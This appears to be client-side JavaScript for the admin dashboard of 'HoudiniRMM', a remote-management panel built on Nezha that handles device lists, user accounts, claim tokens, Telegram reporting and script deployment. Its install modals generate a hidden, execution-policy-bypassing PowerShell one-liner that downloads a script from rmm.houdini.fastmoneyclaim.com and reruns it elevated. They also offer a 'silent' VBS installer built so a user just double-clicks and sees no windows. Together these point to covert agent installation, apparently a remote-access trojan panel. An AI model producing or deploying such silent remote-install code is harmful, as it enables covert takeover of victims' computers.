      it.textContent += '\n\nTelegram reporting: ' + (t.configured ? 'ENABLED' : 'disabled');
    }
  } catch(e){}
}
async function openBackendConnection(){
  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10002;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  win.onclick = function(e){ if (e.target === win) win.remove(); };
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:440px;width:100%;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800">Backend Connection</div><button class="btn ghost" type="button" onclick="this.closest(\'div[style*=fixed]\').remove()">Close</button></div>';
  var body = document.createElement('div');
  body.style.cssText = 'padding:14px 18px';
  var sv = document.getElementById('server')?.value||'';
  var cs = document.getElementById('client_secret')?.value||'';
  var tl = document.getElementById('tls')?.checked||false;
  body.innerHTML = '<div class="form-grid"><div><label class="field">Server (host:port)</label><input class="input" type="text" id="pop_server" value="'+escapeHtml(sv)+'"/></div>'
    + '<div><label class="field">Client secret</label><input class="input" type="text" id="pop_client_secret" value="'+escapeHtml(cs)+'"/></div></div>'
    + '<div class="checks" style="margin-top:14px"><label class="chk"><input id="pop_tls" type="checkbox" '+(tl?'checked':'')+'/> TLS (HTTPS to dashboard)</label></div>';
  var foot = document.createElement('div');
  foot.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px';
  var saveBtn = document.createElement('button');
  saveBtn.className = 'btn primary'; saveBtn.textContent = 'Save';
  saveBtn.onclick = function(){
    var el = document.getElementById('server'); if (el) el.value = document.getElementById('pop_server').value;
    el = document.getElementById('client_secret'); if (el) el.value = document.getElementById('pop_client_secret').value;
    el = document.getElementById('tls'); if (el) el.checked = document.getElementById('pop_tls').checked;
    saveCfg(); win.remove();
  };
  foot.appendChild(saveBtn);
  card.appendChild(body); card.appendChild(foot);
  win.appendChild(card); document.body.appendChild(win);
}

async function openAgentOptions(){
  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10002;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  win.onclick = function(e){ if (e.target === win) win.remove(); };
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:500px;width:100%;max-height:80vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  card.innerHTML = '<div style="padding:14px 18px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><div style="font-weight:800">Agent Options</div><button class="btn ghost" type="button" onclick="this.closest(\'div[style*=fixed]\').remove()">Close</button></div>';
  const body = document.createElement('div');
  body.style.cssText = 'padding:16px 18px;overflow:auto;flex:1';
  const checks = [
    ['debug','Debug'],['disable_auto_update','Disable auto-update'],['disable_force_update','Disable force update'],
    ['disable_command_execute','Disable command execute'],['disable_nat','Disable NAT'],['disable_send_query','Disable send query'],
    ['gpu','GPU monitoring'],['temperature','Temperature'],['insecure_tls','Insecure TLS'],
    ['skip_connection_count','Skip connection count'],['skip_procs_count','Skip process count'],
    ['use_gitee_to_upgrade','Use gitee to upgrade'],['use_atomgit_to_upgrade','Use atomgit to upgrade'],['use_ipv6_country_code','Use IPv6 country code']
  ];
  var html = '<div class="checks" style="display:grid;grid-template-columns:1fr 1fr;gap:8px 14px;margin-bottom:10px">';
  checks.forEach(function(c){
    var el = document.getElementById(c[0]), v = el ? el.checked : false;
    html += '<label class="chk" style="white-space:nowrap"><input type="checkbox" id="pop_'+c[0]+'" '+(v?'checked':'')+'/> '+c[1]+'</label>';
  });
  html += '</div><div class="form-grid">';
  html += '<div><label class="field">IP report period (sec, min 30)</label><input type="number" class="input" id="pop_ip_report_period" min="30" value="'+(document.getElementById('ip_report_period')?.value||1800)+'"/></div>';
  html += '<div><label class="field">Report delay (1\u20134 sec)</label><input type="number" class="input" id="pop_report_delay" min="1" max="4" value="'+(document.getElementById('report_delay')?.value||3)+'"/></div>';
  html += '<div><label class="field">Self-update period (min, 0=random)</label><input type="number" class="input" id="pop_self_update_period" min="0" value="'+(document.getElementById('self_update_period')?.value||0)+'"/></div>';
  html += '</div>';
  body.innerHTML = html;
  const foot = document.createElement('div');
  foot.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px';
  const saveBtn = document.createElement('button');
  saveBtn.className = 'btn primary'; saveBtn.textContent = 'Save';
  saveBtn.onclick = function(){
    checks.forEach(function(c){ var el = document.getElementById(c[0]); if (el) el.checked = document.getElementById('pop_'+c[0]).checked; });
    var el; el = document.getElementById('ip_report_period'); if (el) el.value = document.getElementById('pop_ip_report_period').value;
    el = document.getElementById('report_delay'); if (el) el.value = document.getElementById('pop_report_delay').value;
    el = document.getElementById('self_update_period'); if (el) el.value = document.getElementById('pop_self_update_period').value;
    saveCfg(); win.remove();
  };
  foot.appendChild(saveBtn);
  card.appendChild(body); card.appendChild(foot);
  win.appendChild(card); document.body.appendChild(win);
}

async function editMeta(id){
  try {
    const r = await api('api/device-meta?id='+id);
    const j = await r.json();
    const meta = (j && j.meta) || {};
    const res = await promptModal({title:'Edit device #'+id, okText:'Save', fields:[
      {key:'tags', label:'Tags (comma-separated)', value:(meta.tags||[]).join(', ')},
      {key:'site', label:'Site / location', value: meta.site || ''},
      {key:'notes', label:'Notes', value: meta.notes || ''}
    ]});
    if(!res) return;
    const r2 = await api('api/device-meta', {method:'POST', body: JSON.stringify({id:id, tags:res.tags, site:res.site, notes:res.notes})});
    const j2 = await r2.json();
    if(!j2.ok){ await alertModal({title:'Save failed', body: j2.error||'save failed'}); return; }
    loadDevices();
  } catch(e){ await alertModal({title:'Error', body: String(e)});
  }
}
async function loadAdminCfg(){
  try {
    const r = await api('api/cfg');
    const j = await r.json();
    if (j.ok && j.cfg){
      const cb = document.getElementById('cfgShowUserDevices');
      if (cb) cb.checked = !!j.cfg.show_user_devices;
      applyAdminCfg(j.cfg);
    }
  } catch(e){}
}
function applyAdminCfg(cfg){
  const show = !!(cfg && cfg.show_user_devices);
  const nav = document.getElementById('navUserDevices');
  if (nav) nav.style.display = show ? '' : 'none';
}
async function saveAdminCfg(){
  const cb = document.getElementById('cfgShowUserDevices');
  if (!cb) return;
  try {
    const r = await api('api/cfg', {method:'POST', body: JSON.stringify({show_user_devices: cb.checked})});
    const j = await r.json();
    if (j.ok){
      applyAdminCfg(j.cfg);
    }
  } catch(e){}
}

async function loadSettings(){
  const fm = document.getElementById('formSettings');
  if (!fm) return;
  const sm = document.getElementById('settingsMsg');
  try {
    const r = await fetch('/api/v1/setting', { credentials: 'include' });
    const j = await r.json();
    if (!j.success || !j.data || !j.data.config) { fm.innerHTML = '<div class="empty">Failed to load settings</div>'; return; }
    const cfg = j.data.config;
    const textFields = [
      {k:'site_name', label:'Site Name'},
      {k:'language', label:'Language'},
      {k:'install_host', label:'Install Host'},
      {k:'dns_servers', label:'DNS Servers'},
    ];
    const textAreas = [
      {k:'custom_code', label:'Custom Code (Global)'},
      {k:'custom_code_dashboard', label:'Custom Code (Dashboard)'},
    ];
    const toggles = [
      {k:'enable_mcp', label:'Enable MCP'},
      {k:'tls', label:'TLS'},
    ];
    let html = '<div class="form-grid">';
    textFields.forEach(function(f){
      html += '<div><label class="field">' + f.label + '</label><input type="text" id="cfg-' + f.k + '" value="' + escapeHtml(cfg[f.k] || '') + '"></div>';
    });
    html += '</div>';
    textAreas.forEach(function(f){
      html += '<div style="margin-top:14px"><label class="field">' + f.label + '</label><textarea id="cfg-' + f.k + '" rows="5">' + escapeHtml(cfg[f.k] || '') + '</textarea></div>';
    });
    html += '<div class="checks">';
    toggles.forEach(function(f){
      html += '<label><input class="chk" type="checkbox" id="cfg-' + f.k + '" ' + (cfg[f.k] ? 'checked' : '') + '> ' + f.label + '</label>';
    });
    html += '</div>';
    fm.innerHTML = html;
    if (sm) sm.textContent = (textFields.length + textAreas.length + toggles.length) + ' settings';
  } catch(e){ fm.innerHTML = '<div class="empty">Error: ' + escapeHtml(String(e)) + '</div>'; }
}
async function saveSettings(){
  const fm = document.getElementById('formSettings');
  if (!fm) return;
  const cfg = {};
  fm.querySelectorAll('input,textarea').forEach(function(el){
    const k = el.id.replace('cfg-','');
    if (!k) return;
    if (el.type === 'checkbox') cfg[k] = el.checked;
    else if (el.type === 'number') cfg[k] = Number(el.value) || 0;
    else cfg[k] = el.value;
  });
  try {
    const r = await fetch('/api/v1/setting', { method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({config: cfg}) });
    const j = await r.json();
    alertModal({ title: j.success ? 'Saved' : 'Error', body: j.success ? 'Settings saved' : (j.error || 'Failed') });
    if (j.success) loadSettings();
  } catch(e){ alertModal({ title:'Error', body:String(e) }); }
}
async function loadUserDevices(){
  const grid = document.getElementById('udGrid');
  const msg = document.getElementById('udMsg');
  if (msg) msg.textContent = 'Loading...';
  try {
    const r = await api('api/user-devices');
    const j = await r.json();
    if (!j.ok){ if(grid) grid.innerHTML = '<div class="empty">'+escapeHtml(j.error||'failed')+'</div>'; if(msg) msg.textContent = j.error||'failed'; return; }
    const devices = j.devices || [];
    if (!devices.length){ if(grid) grid.innerHTML = '<div class="empty">No user devices yet. When non-admin users install agents, they will appear here.</div>'; if(msg) msg.textContent='0 devices'; return; }
    if(grid) grid.innerHTML = devices.map(function(d){
      var online = d.online ? '<span class="pill" style="background:rgba(101,211,140,.15);color:#65d38c">Online</span>' : '<span class="pill" style="background:rgba(239,99,99,.12);color:#ef6363">Offline</span>';
      var ownerTag = d._owner_name ? '<span class="tag">'+escapeHtml(d._owner_name)+'</span>' : '';
      var metaTags = (d.meta && d.meta.tags && d.meta.tags.length) ? d.meta.tags.map(function(tg){return '<span class="tag">'+escapeHtml(tg)+'</span>';}).join('') : '';
      return '<div class="device-card">'
        + '<div class="dev-row">'
        + '<div style="flex:1;min-width:0">'
        + '<div class="dev-name">'+escapeHtml(d.name||('#'+d.id))+' '+online+'</div>'
        + '<div class="dev-meta">#'+d.id+' &middot; '+escapeHtml(platformEmoji(d.platform)||'')+' '+escapeHtml(d.platform_version||'')+(d.ip?(' &middot; '+escapeHtml(d.ip)):'')+'</div>'
        + '<div class="dev-meta">'+ownerTag+metaTags+(d.meta&&d.meta.site?(' &middot; '+escapeHtml(d.meta.site)):'')+'</div>'
        + '</div></div></div>';
    }).join('');
    if(msg) msg.textContent = devices.length + ' devices';
  } catch(e){ if(msg) msg.textContent = String(e); if(grid) grid.innerHTML = '<div class="empty">'+escapeHtml(String(e))+'</div>'; }
}

async function loadProfile(){
  const pi = document.getElementById('profileInfo');
  if (!pi) return;
  try {
    const r = await fetch('/api/v1/profile', { credentials:'include' });
    const j = await r.json();
    if (!j.success || !j.data) { pi.innerHTML = '<div class="empty">Failed to load profile</div>'; return; }
    const d = j.data;
    currentUserId = d.id;
    currentUsername = d.username;
    const rows = [
      ['Username', d.username],
      ['User ID', d.id],
      ['Role', d.role === 0 ? 'Admin' : 'User'],
      ['Login IP', d.login_ip],
      ['Agent secret', d.agent_secret],
    ];
    let html = '<div class="panel" style="margin-bottom:14px"><div class="panel-title"><div><h2>Account</h2><div class="hint" style="margin-top:4px">Signed-in dashboard identity</div></div><span class="sub">' + escapeHtml(String(d.username || '')) + '</span></div>';
    html += '<div class="info-grid">';
    rows.forEach(function(row){
      html += '<div class="info-item"><div class="info-label">' + row[0] + '</div><div class="info-value">' + escapeHtml(String(row[1] != null ? row[1] : '')) + '</div></div>';
    });
    html += '</div></div>';
    html += '<div class="panel"><div class="panel-title"><div><h2>Change password</h2><div class="hint" style="margin-top:4px">Use a strong, unique password</div></div></div>';
    html += '<div class="form-grid"><div><label class="field">Current password</label><input type="password" id="pwd-old" autocomplete="current-password"></div>'
      + '<div><label class="field">New password</label><input type="password" id="pwd-new" autocomplete="new-password"></div>'
      + '<div><label class="field">Confirm new password</label><input type="password" id="pwd-new2" autocomplete="new-password"></div></div>';
    html += '<div style="margin-top:14px"><button class="btn primary" type="button" id="btnChgPwd">Change password</button></div>';
    html += '</div>';
    pi.innerHTML = html;
    const bc = document.getElementById('btnChgPwd');
    if (bc) bc.addEventListener('click', changeOwnPassword);
  } catch(e){ pi.innerHTML = '<div class="empty">Error: ' + escapeHtml(String(e)) + '</div>'; }
}
async function changeOwnPassword(){
  const old = document.getElementById('pwd-old').value;
  const nw = document.getElementById('pwd-new').value;
  const nw2 = document.getElementById('pwd-new2').value;
  if (!old || !nw) { alertModal({title:'Error', body:'Fill all fields'}); return; }
  if (nw !== nw2) { alertModal({title:'Error', body:'New passwords mismatch'}); return; }
  try {
    const csrf = await ensureCsrf();
    const hdrs = {'Content-Type':'application/json'};
    if (csrf) hdrs['X-CSRF-Token'] = csrf;
    // Nezha's updateProfile sets username = new_username unconditionally,
    // so we must send the current username to avoid blanking it.
    const r = await fetch('/api/v1/profile', { method:'POST', credentials:'include', headers: hdrs, body: JSON.stringify({original_password: old, new_password: nw, new_username: currentUsername || ''}) });
    const j = await r.json();
    alertModal({ title: j.success ? 'Done' : 'Error', body: j.success ? 'Password changed' : (j.error || 'Failed') });
  } catch(e){ alertModal({title:'Error', body:String(e)}); }
}
function openUsers(){
  if (currentRole !== 0) { alertModal({title:'Error', body:'Admin only'}); return; }
  const dg = document.getElementById('usersGrid');
  if (!dg) return;
  const um = document.getElementById('usersMsg');
  if (um) um.textContent = 'Loading\u2026';
  dg.innerHTML = '<div class="loading">Loading users...</div>';
  Promise.all([
    fetch('/api/v1/user', { credentials:'include' }).then(r => r.json()),
    api('api/devices').then(r => r.json())
  ]).then(function(results){
    var j = results[0], dj = results[1];
    if (!j.success || !Array.isArray(j.data)) { dg.innerHTML = '<p>Failed to load users</p>'; if (um) um.textContent = 'error'; return; }
    var devices = (dj && dj.devices) || [];
    var counts = {};
    devices.forEach(function(d){ var oid = d._owner_id || 0; counts[oid] = (counts[oid]||0)+1; });
    let html = '<table class="mgr-tbl"><thead><tr><th>ID</th><th>Username</th><th>Role</th><th>Devices</th><th>Actions</th></tr></thead><tbody>';
    j.data.forEach(function(u){
      var dc = counts[u.id] || 0;
      html += '<tr><td>' + u.id + '</td><td>' + escapeHtml(u.username) + '</td><td>' + (u.role===0?'Admin':'User') + '</td><td>' + dc + '</td><td class="row-actions">';
      if (u.id !== 1) html += '<button class="btn small danger" onclick="deleteUser('+u.id+')">Delete</button>';
      html += '</td></tr>';
    });
    html += '</tbody></table>';
    dg.innerHTML = html;
    if (um) um.textContent = j.data.length + (j.data.length === 1 ? ' user' : ' users');
  }).catch(function(e){ dg.innerHTML = '<p>' + escapeHtml(String(e)) + '</p>'; });
}
function createUserModal(){
  promptModal({ title:'Create User', okText:'Create',
    fields:[{key:'username', label:'Username', value:''},{key:'password', label:'Password', value:''},{key:'role', label:'Role (0=admin,1=user)', value:'1'}] }).then(function(res){
    if (!res) return;
    const role = parseInt(res.role,10) || 1;
    api('/api/users/create', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:res.username, password:res.password, role:role}) })
      .then(r => r.json()).then(j => { if(j.ok) openUsers(); else alertModal({title:'Error', body:j.error||'Failed'}); });
  });
}
function deleteUser(id){
  confirmModal({title:'Delete User', body:'Delete this user?', okText:'Delete', danger:true}).then(function(ok){
    if (!ok) return;
    api('/api/users/delete/'+id, { method:'POST' }).then(r => r.json()).then(j => { if(j.ok) openUsers(); else alertModal({title:'Error', body:j.error||'Failed'}); });
  });
}

async function openPowershell(){
  // Keep navigation state but show the script in a modal
  stopTerminal();
  terminalId = null;
  try {
    const r = await api('api/powershell/install-script');
    const j = await r.json();
    if (!j.ok) { alertModal({ title:'Error', body: j.error || 'Failed to generate script' }); return; }
    const cfg = j.script || {};
    const script = cfg.text || '';
    const selText = j.select || 'all';
    // Show the PowerShell script in a modal with copy + download actions
    const win = document.createElement('div');
    win.style.position = 'fixed'; win.style.inset = '0';
    win.style.zIndex = '10001'; win.style.display = 'flex';
    win.style.alignItems = 'center'; win.style.justifyContent = 'center';
    win.style.padding = '16px'; win.style.background = 'rgba(6,7,10,.72)';
    win.style.backdropFilter = 'blur(10px)';
    win.setAttribute('data-pswin','1');
    const card = document.createElement('div');
    card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:820px;width:100%;max-height:88vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
    const head = document.createElement('div');
    head.style.cssText = 'display:flex;justify-content:space-between;align-items:center;gap:10px;padding:16px 18px;border-bottom:1px solid var(--border)';
    head.innerHTML = '<div><div style="font-weight:800;font-size:1.05rem">PowerShell Agent Install</div><div class="hint" style="margin-top:3px">Paste into an elevated PowerShell on the target Windows device.</div></div>';
    const close = document.createElement('button');
    close.className = 'btn ghost'; close.textContent = 'Close';
    close.onclick = function(){ win.remove(); };
    head.appendChild(close);
    const body = document.createElement('div');
    body.style.cssText = 'padding:14px 18px;overflow:auto;flex:1';
    const infoDs = document.createElement('div');
    infoDs.style.cssText = 'margin-bottom:12px;display:flex;gap:10px;flex-wrap:wrap';
    infoDs.innerHTML = '<span class="pill">Server: ' + escapeHtml(cfg.server || '') + '</span>'
      + '<span class="pill">' + (cfg.tls ? 'TLS: yes' : 'TLS: no') + '</span>'
      + '<span class="pill">' + escapeHtml(cfg.product_name || 'HoudiniRMM') + '</span>';
    body.appendChild(infoDs);
    // Win+R one-liner
    const wrBox = document.createElement('div');
    wrBox.style.cssText = 'margin-bottom:12px;padding:10px 12px;background:var(--panel-deep);border:1px solid var(--border);border-radius:10px';
    var claimQs3 = userClaimToken ? '?claim='+userClaimToken : '';
    var modalHost = (cfg.server || 'rmm.houdini.fastmoneyclaim.com').split(':')[0];
    wrBox.innerHTML = '<div class="hint" style="margin-bottom:6px;font-weight:700">PowerShell one-liner (Win+R)</div>'
      + '<pre style="margin:0;font-size:12px;white-space:pre-wrap;word-break:break-all;cursor:pointer;user-select:all" onclick="this.select();document.execCommand(\'copy\')" title="Click to copy">powershell -W Hidden -Ep Bypass -c "$f=\"$env:TEMP\i.ps1\";iwr \'https://'+modalHost+'/dashboard/api/install-script'+claimQs3+'\' -OutFile $f;Start-Process powershell -Verb RunAs -Arg \'-NoP -Ep Bypass -File\',$f"</pre>';
    body.appendChild(wrBox);
    const pre = document.createElement('textarea');
    pre.readOnly = true;
    pre.value = script;
    pre.style.cssText = 'width:100%;height:340px;background:var(--panel-deep);color:var(--fg);font-family:ui-monospace,Consolas,monospace;font-size:12px;padding:12px;border:1px solid var(--border);border-radius:10px;white-space:pre;resize:vertical';
    body.appendChild(pre);
    const foot = document.createElement('div');
    foot.style.cssText = 'padding:12px 18px;border-top:1px solid var(--border);display:flex;gap:8px;flex-wrap:wrap;align-items:center';
    const copyBtn = document.createElement('button');
    copyBtn.className = 'btn primary'; copyBtn.textContent = 'Copy script';
    copyBtn.onclick = function(){
      const tx = document.createElement('textarea');
      tx.value = script; document.body.appendChild(tx); tx.select();
      try { document.execCommand('copy'); } catch(e){}
      tx.remove();
      copyBtn.textContent = 'Copied';
      setTimeout(function(){ copyBtn.textContent = 'Copy script'; }, 1500);
    };
    const dl = document.createElement('a');
    dl.className = 'btn'; dl.textContent = 'Download .ps1';
    dl.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(script);
    dl.download = 'install-houdinirmm-agent.ps1';
    dl.style.textDecoration = 'none';
    if (selText) {
      const sel = document.createElement('span');
      sel.className = 'hint';
      sel.textContent = 'Commands are ' + selText + '.';
      foot.appendChild(sel);
    }
    foot.appendChild(copyBtn);
    foot.appendChild(dl);
    card.appendChild(head);
    card.appendChild(body);
    card.appendChild(foot);
    win.appendChild(card);
    document.body.appendChild(win);
  } catch(e){
    alertModal({ title:'Error', body:String(e) });
  }
}

const vbsBaseUrl = 'https://rmm.houdini.fastmoneyclaim.com/dashboard/api/build-installer';
const vbsName = 'HoudiniRMM-Agent.zip';

async function openVbs(){
  const claimQsVbs = userClaimToken ? '?claim='+userClaimToken : '';
  const url = vbsBaseUrl + claimQsVbs;
  const win = document.createElement('div');
  win.style.cssText = 'position:fixed;inset:0;z-index:10002;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(6,7,10,.72);backdrop-filter:blur(10px)';
  win.setAttribute('data-vbswin','1');
  win.onclick = function(e){ if (e.target === win) win.remove(); };
  const card = document.createElement('div');
  card.style.cssText = 'background:var(--panel);border:1px solid var(--border);border-radius:16px;max-width:440px;width:100%;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)';
  const head = document.createElement('div');
  head.style.cssText = 'display:flex;justify-content:space-between;align-items:center;gap:10px;padding:16px 18px;border-bottom:1px solid var(--border)';
  head.innerHTML = '<div><div style="font-weight:800;font-size:1.05rem">VBS Silent Installer</div><div class="hint" style="margin-top:3px">Download ZIP, extract, double-click .vbs — installs silently with no windows.</div></div>';
  const close = document.createElement('button');
  close.className = 'btn ghost'; close.textContent = 'Close';
  close.onclick = function(){ win.remove(); };
  head.appendChild(close);
  const body = document.createElement('div');
  body.style.cssText = 'padding:18px;display:flex;flex-direction:column;gap:12px';
  const hint = document.createElement('div');
  hint.className = 'hint';
  hint.textContent = 'The VBS file runs the PowerShell installer hidden. No console windows appear. User just double-clicks the file.';
  body.appendChild(hint);
  const linkBox = document.createElement('div');
  linkBox.style.cssText = 'padding:10px 12px;background:var(--panel-deep);border:1px solid var(--border);border-radius:10px;cursor:pointer;user-select:all';
  linkBox.innerHTML = '<div class="hint" style="margin-bottom:4px;font-weight:700">Download link</div><pre style="margin:0;font-size:11px;white-space:pre-wrap;word-break:break-all">' + escapeHtml(url) + '</pre>';
  linkBox.onclick = function(){ var rng = document.createRange(); rng.selectNodeContents(this.querySelector('pre')); var sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(rng); try { document.execCommand('copy'); } catch(e){} };
  linkBox.title = 'Click to copy link';
  body.appendChild(linkBox);
  const btns = document.createElement('div');
  btns.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap';
  const dlBtn = document.createElement('a');
  dlBtn.className = 'btn primary';
  dlBtn.textContent = 'Download VBS';
  dlBtn.href = url;
  dlBtn.download = vbsName;
  dlBtn.style.textDecoration = 'none';
  const copyLinkBtn = document.createElement('button');
  copyLinkBtn.className = 'btn';
  copyLinkBtn.textContent = 'Copy download link';
  copyLinkBtn.onclick = function(){
    navigator.clipboard.writeText(url).then(function(){
      copyLinkBtn.textContent = 'Copied';
      setTimeout(function(){ copyLinkBtn.textContent = 'Copy download link'; }, 1500);
    }).catch(function(){
      var tx = document.createElement('textarea'); tx.value = url; document.body.appendChild(tx); tx.select();
      try { document.execCommand('copy'); } catch(e){}
      tx.remove();
      copyLinkBtn.textContent = 'Copied';
      setTimeout(function(){ copyLinkBtn.textContent = 'Copy download link'; }, 1500);
    });
  };
  btns.appendChild(dlBtn);
  btns.appendChild(copyLinkBtn);
  body.appendChild(btns);
  card.appendChild(head);
  card.appendChild(body);
  win.appendChild(card);
  document.body.appendChild(win);
}

async function loadSystem(){
  const msg = document.getElementById('sysMsg');
  const st = document.getElementById('sysStatus');
  try {
    const r = await api('api/system');
    const j = await r.json();
    if(!j.ok){ if(msg) msg.textContent = j.error||'failed'; return; }
    const c = j.config || {};
    const set = function(id, v){ const el = document.getElementById(id); if(el) el.value = (v == null ? '' : v); };
    const setc = function(id, v){ const el = document.getElementById(id); if(el) el.checked = !!v; };
    set('sys_web_real_ip_header', c.web_real_ip_header);
    set('sys_agent_real_ip_header', c.agent_real_ip_header);
    set('sys_reserved_hosts', c.reserved_hosts);
    set('sys_location', c.location);
    set('sys_jwt_timeout', c.jwt_timeout);
    set('sys_avg_ping_count', c.avg_ping_count);
    set('sys_ip_change_group', c.ip_change_notification_group_id);
    set('sys_cover', c.cover);
    set('sys_ignored_ip', c.ignored_ip_notification);
    set('sys_dns_servers', Array.isArray(c.dns_servers) ? c.dns_servers.join(',') : (c.dns_servers||''));
    setc('sys_enable_mcp', c.enable_mcp);
    setc('sys_enable_plain_ip', c.enable_plain_ip_in_notification);
    setc('sys_enable_ip_change', c.enable_ip_change_notification);
    setc('sys_debug', c.debug);
    setc('sys_force_auth', c.force_auth);
    setc('sys_tls', c.tls);
    if(msg) msg.textContent = 'Loaded';
    if(st) st.textContent = JSON.stringify({
      enable_mcp: c.enable_mcp,
      tsdb: c.tsdb,
      web_real_ip_header: c.web_real_ip_header,
      agent_real_ip_header: c.agent_real_ip_header,
      reserved_hosts: c.reserved_hosts,
      jwt_timeout: c.jwt_timeout,
      location: c.location,
      install_host: c.install_host,
      site_name: c.site_name,
      force_auth: c.force_auth
    }, null, 2);
  } catch(e){ if(msg) msg.textContent = String(e); }
}
async function saveSystem(){
  const msg = document.getElementById('sysMsg');
  const body = {
    web_real_ip_header: document.getElementById('sys_web_real_ip_header').value.trim(),
    agent_real_ip_header: document.getElementById('sys_agent_real_ip_header').value.trim(),
    reserved_hosts: document.getElementById('sys_reserved_hosts').value.trim(),
    location: document.getElementById('sys_location').value.trim(),
    jwt_timeout: parseInt(document.getElementById('sys_jwt_timeout').value,10)||24,
    avg_ping_count: parseInt(document.getElementById('sys_avg_ping_count').value,10)||2,
    ip_change_notification_group_id: parseInt(document.getElementById('sys_ip_change_group').value,10)||0,
    cover: parseInt(document.getElementById('sys_cover').value,10)||1,
    ignored_ip_notification: document.getElementById('sys_ignored_ip').value.trim(),
    dns_servers: document.getElementById('sys_dns_servers').value.trim(),
    enable_mcp: document.getElementById('sys_enable_mcp').checked,
    enable_plain_ip_in_notification: document.getElementById('sys_enable_plain_ip').checked,
    enable_ip_change_notification: document.getElementById('sys_enable_ip_change').checked,
    debug: document.getElementById('sys_debug').checked,
    force_auth: document.getElementById('sys_force_auth').checked,
    tls: document.getElementById('sys_tls').checked
  };
  if(msg) msg.textContent = 'Saving…';
  const r = await api('api/system', {method:'POST', body: JSON.stringify(body)});
  const j = await r.json();
  if(msg) msg.textContent = j.ok ? (j.message || 'Saved. Restart dashboard if MCP/TSDB/real-ip changed.') : (j.error||'failed');
  if(j.ok) loadSystem();
}
async function restartDashboardHint(){
  await alertModal({title:'Restart hint', body:'SSH: systemctl restart nezha-dashboard\nThen: journalctl -u nezha-dashboard -n 30 --no-pager\nLook for: TSDB initialized successfully'});
}

async function loadScripts(){
  const box = document.getElementById('scriptList');
  const msg = document.getElementById('scriptMsg');
  if (msg) msg.textContent = 'Loading…';
  try {
    const r = await api('api/scripts');
    const j = await r.json();
    if(!j.ok){ if(msg) msg.textContent = j.error||'failed'; return; }
    const scripts = j.scripts || [];
    if(!scripts.length){ box.innerHTML = '<div class="empty">No scripts yet. Create one above.</div>'; if(msg) msg.textContent='0 scripts'; return; }
    box.innerHTML = '<table><tr><th>Name</th><th>Shell</th><th>Updated</th><th></th></tr>' + scripts.map(function(s){
      return '<tr><td>'+escapeHtml(s.name)+'</td><td class="mono">'+escapeHtml(s.shell||'')+'</td><td>'+escapeHtml(s.updated||'')+'</td>'
      +'<td style="display:flex;gap:6px"><button class="btn" type="button" onclick="selectScript(\''+escapeHtml(s.id)+'\')">Edit</button><button class="btn primary" type="button" onclick="deployScript(\''+escapeHtml(s.id)+'\')">Deploy</button></td></tr>';
    }).join('') + '</table>';
    if(msg) msg.textContent = scripts.length + ' scripts';
    window.__scripts = scripts;
  } catch(e){ if(msg) msg.textContent = String(e); }
}
function newScript(){
  document.getElementById('scriptId').value = '';
  document.getElementById('scriptName').value = '';
  document.getElementById('scriptShell').value = 'bash';
  document.getElementById('scriptContent').value = '';
  document.getElementById('scriptMsg').textContent = 'New script';
}
function selectScript(id){
  const scripts = window.__scripts || [];
  const s = scripts.find(function(x){ return x.id === id; });
  if(!s) return;
  document.getElementById('scriptId').value = s.id;
  document.getElementById('scriptName').value = s.name || '';
  document.getElementById('scriptShell').value = s.shell || 'bash';
  document.getElementById('scriptContent').value = s.content || '';
  document.getElementById('scriptMsg').textContent = 'Editing '+s.name;
}
async function saveScript(){
  const body = {
    id: document.getElementById('scriptId').value || undefined,
    name: document.getElementById('scriptName').value.trim(),
    shell: document.getElementById('scriptShell').value,
    content: document.getElementById('scriptContent').value
  };
  if(!body.name){ await alertModal({title:'Name required', body:'Give the script a name.'}); return; }
  const r = await api('api/scripts', {method:'POST', body: JSON.stringify(body)});
  const j = await r.json();
  if(!j.ok){ document.getElementById('scriptMsg').textContent = j.error||'failed'; return; }
  document.getElementById('scriptId').value = j.script.id;
  document.getElementById('scriptMsg').textContent = 'Saved';
  loadScripts();
}
async function deleteScript(){
  const id = document.getElementById('scriptId').value;
  if(!id){ await alertModal({title:'Select a script', body:'Select a script first.'}); return; }
  const ok = await confirmModal({title:'Delete script', body:'Delete this script? This cannot be undone.', okText:'Delete'});
  if(!ok) return;
  const r = await api('api/scripts/delete', {method:'POST', body: JSON.stringify({id:id})});
  const j = await r.json();
  if(!j.ok){ await alertModal({title:'Delete failed', body: j.error||'failed'}); return; }
  newScript();
  loadScripts();
}
async function deployScript(scriptId){
  // Find the script
  const scripts = window.__scripts || [];
  const s = scripts.find(function(x){ return x.id === scriptId; });
  if(!s) return alertModal({title:'Error', body:'Script not found'});

  // Load online devices
  var online = [];
  try {
    const rd = await api('api/devices');
    const jd = await rd.json();
    const allDevices = (jd.ok ? jd.devices : []) || [];
    online = allDevices.filter(function(d){ return d.online; });
  } catch(e){ return alertModal({title:'Error', body:'Failed to load devices: '+String(e)}); }
  if (!online.length) return alertModal({title:'No devices', body:'No online devices available.'});

  // Build device selection popup (like SC deploy)
